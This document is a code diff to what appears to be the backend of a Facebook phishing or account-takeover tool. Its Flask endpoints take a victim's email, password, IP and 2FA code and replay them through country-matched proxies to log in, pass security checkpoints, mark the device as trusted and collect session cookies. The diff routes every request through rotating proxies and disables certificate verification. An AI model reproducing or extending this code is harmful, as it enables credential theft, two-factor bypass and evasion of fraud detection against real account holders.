@@ -46,7 +46,8 @@ class Facebook:
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
         }
 
-        rq = requests.get(url, headers=headers, proxies=self.proxy)
+        rq = requests.get(url, headers=headers,
+                          proxies=self.get_proxy(), verify=False)
 
         # print(rq.text)
 
@@ -96,13 +97,8 @@ class Facebook:
             'Content-Length': '84',
         }
 
-        proxies = {
-            'http': 'http://user:pass@geo.iproyal.com:12321',
-            'https': 'http://user:pass@geo.iproyal.com:12321'
-        }
-
         rq = requests.post(url, data=payload, headers=headers,
-                           proxies=self.proxy)
+                           proxies=self.get_proxy(), verify=False)
 
         # if rq.status_code == 200:
         #     return False
@@ -122,7 +118,8 @@ class Facebook:
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
         }
 
-        rq = requests.get(url, headers=headers, proxies=self.proxy)
+        rq = requests.get(url, headers=headers,
+                          proxies=self.get_proxy(), verify=False)
 
         # print(rq.text)
 
@@ -149,9 +146,9 @@ class Facebook:
         return jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie
 
     def check_password(self, user: str, password: str, ip: str):
+        # Set global country
         self.proxy_country = self.check_ip_country(ip)
-        proxy = self.get_proxy()
-        print(proxy)
+
         url = 'https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8'
 
         jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie = self.get_data_password()
@@ -172,7 +169,7 @@ class Facebook:
         payload = f'lsd={lsd}&jazoest={jazoest}&m_ts={m_ts}&li={li}&try_number={try_number}&unrecognized_tries={unrecognized_tries}&email={user}&pass={password}&login=Se+connecter&bi_xrwh=0'
 
         rq = requests.post(url, data=payload, headers=headers,
-                           proxies=self.proxy)
+                           proxies=self.get_proxy(), verify=False)
 
         if '/login/device-based/update-nonce/' in rq.text:
             return True
@@ -212,7 +209,7 @@ class Facebook:
         payload = f'lsd={lsd}&jazoest={jazoest}&m_ts={m_ts}&li={li}&try_number={try_number}&unrecognized_tries={unrecognized_tries}&email={user}&pass={password}&login=Se+connecter&bi_xrwh=0'
         self.session = requests.Session()
         rq = self.session.post(
-            url, data=payload, headers=headers, proxies=self.proxy)
+            url, data=payload, headers=headers, proxies=self.get_proxy(), verify=False)
 
         if 'submit[Submit Code]' in rq.text:
             print('2fa')
@@ -268,7 +265,7 @@ class Facebook:
         payload = f'fb_dtsg={fb_dtsg}&jazoest={jazoest}&checkpoint_data={checkpoint_data}&approvals_code={code}&codes_submitted=0&submit%5BSubmit+Code%5D=Envoyer+le+code&nh={nh}&fb_dtsg={fb_dtsg}&jazoest={jazoest}'
 
         rq = self.session.post(
-            url, data=payload, headers=headers, proxies=self.proxy)
+            url, data=payload, headers=headers, proxies=self.get_proxy(), verify=False)
 
         # get cookies
         cookies = rq.cookies.get_dict()
@@ -304,7 +301,7 @@ class Facebook:
         payload = f'fb_dtsg={fb_dtsg}&jazoest={jazoest}&checkpoint_data={checkpoint_data}&name_action_selected=save_device&submit%5BContinue%5D=Continuer&nh={nh}&fb_dtsg={fb_dtsg}&jazoest={jazoest}'
 
         rq = self.session.post(
-            url, data=payload, headers=headers, proxies=self.proxy)
+            url, data=payload, headers=headers, proxies=self.get_proxy(), verify=False)
 
         # get cookies
         cookies = rq.cookies.get_dict()
@@ -340,7 +337,7 @@ class Facebook:
         payload = f'fb_dtsg={fb_dtsg}&jazoest={jazoest}&checkpoint_data={checkpoint_data}&submit%5BContinue%5D=Continuer&nh={nh}&fb_dtsg={fb_dtsg}&jazoest={jazoest}'
 
         rq = self.session.post(
-            url, data=payload, headers=headers, proxies=self.proxy)
+            url, data=payload, headers=headers, proxies=self.get_proxy(), verify=False)
 
         # get cookies
         cookies = rq.cookies.get_dict()
@@ -376,7 +373,7 @@ class Facebook:
         payload = f'fb_dtsg={fb_dtsg}&jazoest={jazoest}&checkpoint_data={checkpoint_data}&submit%5BThis+was+me%5D=C%E2%80%99%C3%A9tait+moi&nh={nh}&fb_dtsg={fb_dtsg}&jazoest={jazoest}'
 
         rq = self.session.post(
-            url, data=payload, headers=headers, proxies=self.proxy)
+            url, data=payload, headers=headers, proxies=self.get_proxy(), verify=False)
 
         # get cookies
         cookies = rq.cookies.get_dict()
@@ -413,7 +410,7 @@ class Facebook:
         payload = f'fb_dtsg={fb_dtsg}&jazoest={jazoest}&checkpoint_data={checkpoint_data}&name_action_selected=save_device&submit%5BContinue%5D=Continuer&nh={nh}&fb_dtsg={fb_dtsg}&jazoest={jazoest}'
 
         rq = self.session.post(url, data=payload, headers=headers,
-                               allow_redirects=False, proxies=self.proxy)
+                               allow_redirects=False, proxies=self.get_proxy(), verify=False)
 
         # get cookies
         cookies = rq.cookies.get_dict()
@@ -426,11 +423,10 @@ class Facebook:
 @app.route('/check-email', methods=['POST'])
 @cross_origin(supports_credentials=True)
 def check_email():
+    global is_login_successful
     data = request.get_json()
     email = data.get('email')
     fb = Facebook(ua)
-    global is_login_successful
-    is_login_successful = 0
     try:
         is_login_successful = fb.check_valid_account(email)
     except:
@@ -491,10 +487,8 @@ def check_towfa():
 
     fb = Facebook(ua)
 
-    # proxy
+    # set global country
     fb.proxy_country = fb.check_ip_country(ip)
-    proxy = fb.get_proxy()
-    print(proxy)
 
     # is_login_successful = fb.login_get_cookies(password, email, towfa)
 
